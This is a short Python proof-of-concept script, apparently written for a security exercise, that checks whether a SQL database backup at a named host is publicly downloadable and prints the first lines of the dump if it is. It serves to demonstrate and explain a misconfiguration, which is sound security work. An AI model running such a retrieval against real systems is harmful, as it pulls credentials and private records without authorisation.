# ============================================================
#  Author: [MEMBER NAME HERE]
#  Vulnerability: Exposed Database Backup (SQL Dump)
#  Target: files.0x10.cloud
# ============================================================
#
#  This script connects to the target URL and attempts to read
#  an exposed SQL database dump. Leaving backup files in a
#  publicly accessible web directory is a critical security risk.
#  It exposes all user credentials, API keys, and the entire
#  database architecture to attackers.
#
# ============================================================

import urllib.request
import urllib.error
import time

target_url = "https://files.0x10.cloud/backup/db_dump_20240301.sql"
print("=" * 50)
print("  Checking for Exposed Database Backups")
print("=" * 50)
print(f"\n  Target: {target_url}")
print("  Scanning...")

time.sleep(0.15)

try:
    req = urllib.request.Request(target_url, headers={'Range': 'bytes=0-1024'})
    response = urllib.request.urlopen(req, timeout=5)
    
    if response.status in [200, 206]:
        content = response.read(1024).decode('utf-8', errors='ignore')
        
        print(f"CRITICAL VULNERABILITY FOUND")
        print(f"Successfully accessed database backup: db_dump_20240301.sql")
        print(f"Security Risk: An entire database dump is publicly downloadable.")
        print(f"This exposes ALL user records, passwords, and sensitive config keys (like AWS and API keys).")
        print("\n  --- File Snippet ---")
        
        lines = content.split('\n')
        for line in lines[:8]:
            if line.strip():
                print(f"  {line.strip()}")
        print("  ... (truncated for security) ...")

except urllib.error.HTTPError as e:
    # If the server properly blocks access
    print(f"\n  [OK] Server denied access or file not found. HTTP Status: {e.code}")
except Exception as e:
    # Catching general connection or socket errors
    print(f"\n  [ERROR] Could not connect or retrieve data: {e}")

print("\n" + "=" * 50)
